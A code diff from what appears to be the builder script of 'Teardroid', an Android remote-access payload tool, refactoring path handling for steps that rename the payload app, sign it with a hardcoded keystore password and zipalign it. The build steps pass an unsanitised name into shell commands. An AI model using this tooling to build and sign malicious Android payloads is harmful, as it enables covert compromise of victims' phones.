@@ -5,7 +5,8 @@ from colorama import Fore, Style
 class Teardroid:
     def __init__(self, name) -> None:
         self.name = name
-        self.AppInfo = os.getcwd() + "/Teardroid_Payload/smali/com/example/teardroidv2/AppInfo.smali"
+        self.AppInfo = os.path.join(os.getcwd(
+        ), "Teardroid_Payload", "smali", "com", "example", "teardroidv2", "AppInfo.smali")
 
     def build(self, hostname) -> None:
         self.print_result("Building Teardroid")
@@ -32,7 +33,8 @@ class Teardroid:
 
     def changeAppname(self) -> None:
         self.print_result("Changing app name to " + self.name)
-        file = os.getcwd() + "/Teardroid_Payload/res/values/strings.xml"
+        file = os.path.join(os.getcwd(), "Teardroid_Payload",
+                            "res", "values", "strings.xml")
         self.modify_file({'data': '    <string name="app_name">{AppName}</string>'.format(
             AppName=self.name), 'line_number': 31, 'file': file})
         self.print_result("Changing app name completed")
@@ -51,11 +53,11 @@ class Teardroid:
             filewriter.writelines(data)
 
     def SingAPK(self) -> None:
-        os.system(
-            os.getcwd() + "/apksigner sign --ks hacksec.jks --ks-key-alias key0 --ks-pass pass:root1337 --key-pass pass:root1337 " + self.name + ".apk")
+        os.system(os.path.join(os.getcwd(), "apksigner") +
+                  " sign --ks hacksec.jks --ks-key-alias key0 --ks-pass pass:root1337 --key-pass pass:root1337 " + self.name + ".apk")
 
     def CompressAPK(self) -> None:
-        os.system(os.getcwd() + "/zipalign -v 4 " + self.name +
+        os.system(os.path.join(os.getcwd(), "zipalign") + " -v 4 " + self.name +
                   "_uncompressed.apk " + self.name + ".apk")
 
     def Clear(self) -> None:
